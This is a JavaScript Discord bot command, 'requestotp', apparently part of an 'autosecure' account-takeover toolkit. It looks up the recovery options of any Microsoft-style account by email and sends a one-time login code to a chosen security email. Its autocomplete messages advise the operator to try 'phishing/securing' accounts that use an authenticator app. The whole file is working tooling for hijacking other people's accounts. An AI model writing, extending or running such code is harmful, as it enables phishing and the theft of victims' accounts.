const { ApplicationCommandOptionType, EmbedBuilder } = require("discord.js");
const axios = require("axios");
const generate = require('../../utils/generate');
const { queryParams } = require("../../../db/database");
const getCredentials = require('../../utils/info/getCredentials');
const sendotp = require("../../../autosecure/utils/secure/sendotp");

const securityOptionsCache = new Map();
const securityDataCache = new Map();
const securityDisplayCache = new Map();

module.exports = {
  name: "requestotp",
  description: "Request OTP from your email",
  enabled: true,
  options: [
    {
      name: "email",
      description: "Email to send OTP to",
      type: ApplicationCommandOptionType.String,
      required: true,
      autocomplete: false
    },
    {
      name: "security",
      description: "Choose a security option to send a code to!",
      type: ApplicationCommandOptionType.String,
      required: true,
      autocomplete: true
    }
  ],
  userOnly: true,

    autocomplete: async (client, interaction) => {
    const focusedOption = interaction.options.getFocused(true);
    
    if (focusedOption.name === "security") {
      const email = interaction.options.getString("email");
      
      if (!email) {
        return interaction.respond([
          { name: "Please enter an email first", value: "none" }
        ]);
      }
      
            if (!securityOptionsCache.has(email)) {
        try {
        let profiles = await getCredentials(email, false)
        console.log(`profiles: ${profiles}`)
       
          try {
           if (!profiles?.Credentials) {
  return interaction.respond([
    { name: "Email doesn't exist!", value: "invalid_email" }
  ]);
}

if (profiles?.Credentials?.RemoteNgcParams) {
  return interaction.respond([
    { name: "This account has an Auth App, try phishing/securing it.", value: "auth" }
  ]);
}

if (!profiles?.Credentials?.OtcLoginEligibleProofs || profiles.Credentials.OtcLoginEligibleProofs.length === 0) {
  return interaction.respond([
    { name: "No Security Emails found for that email!", value: "no_security" }
  ]);
}

securityOptionsCache.set(email, profiles.Credentials.OtcLoginEligibleProofs);

          } catch (error) {
                        return interaction.respond([
              { name: "Invalid email", value: "invalid_email" }
            ]);
          }
        } catch (error) {
                    return interaction.respond([
            { name: "Invalid email", value: "invalid_email" }
          ]);
        }
      }
      
            const securityOptions = securityOptionsCache.get(email);
      
      if (!securityOptions || securityOptions.length === 0) {
        return interaction.respond([
          { name: "No security options available", value: "none" }
        ]);
      }
      
            const filteredOptions = securityOptions.filter(option => 
        option.display.toLowerCase().includes(focusedOption.value.toLowerCase())
      );
      
            const responseOptions = filteredOptions.map(option => {
                const shortId = generate(8);         
                securityDataCache.set(`${shortId}|${email}`, option.data);
                securityDisplayCache.set(`${shortId}|${email}`, option.display);
        
        return {
          name: option.display,
          value: `${shortId}|${email}`         };
      });
      
      return interaction.respond(responseOptions);
    }
  },
  callback: async (client, interaction) => {
    const email = interaction.options.getString("email");
    const securityOption = interaction.options.getString("security");
    
        if (securityOption === "invalid_email" || securityOption === "none") {
      return interaction.reply({ 
        content: "Please enter a valid email first then select a security option!", 
        ephemeral: true 
      });
    }

    if (securityOption === "no_security") {
      return interaction.reply({ 
        content: "This account has no security email(s)", 
        ephemeral: true 
      });
    }

        if (securityOption === "auth") {
      return interaction.reply({ 
        content: "Cannot send a code to an account with an Auth App!", 
        ephemeral: true 
      });
    }
    
    try {
            const [shortId, emailFromOption] = securityOption.split("|");
      
            const secId = securityDataCache.get(securityOption);
      
      if (!secId) {
        return interaction.reply({ 
          content: "Selected security option is no longer valid. Please try again.", 
          ephemeral: true 
        });
      }
      
            const displayName = securityDisplayCache.get(securityOption);
      
            const otpSent = await sendotp(email, secId);
      
      if (otpSent) {
        const embed = new EmbedBuilder()
          .setColor("#AEC8E8")            .setTitle(`Sent OTP to \`${displayName}\`.`)
        
        return interaction.reply({
          embeds: [embed],
          ephemeral: true
        });
      } else {
        return interaction.reply({ 
          content: `Failed to send the code. Please try again later.`,
          ephemeral: true 
        });
      }
    } catch (error) {
            return interaction.reply({ 
        content: "An error occurred while sending the code. Please try again.",
        ephemeral: true 
      });
    } finally {
            securityOptionsCache.delete(email);
                  for (const key of securityDataCache.keys()) {
        if (key.includes(email)) {
          securityDataCache.delete(key);
          securityDisplayCache.delete(key);
        }
      }
    }
  },
};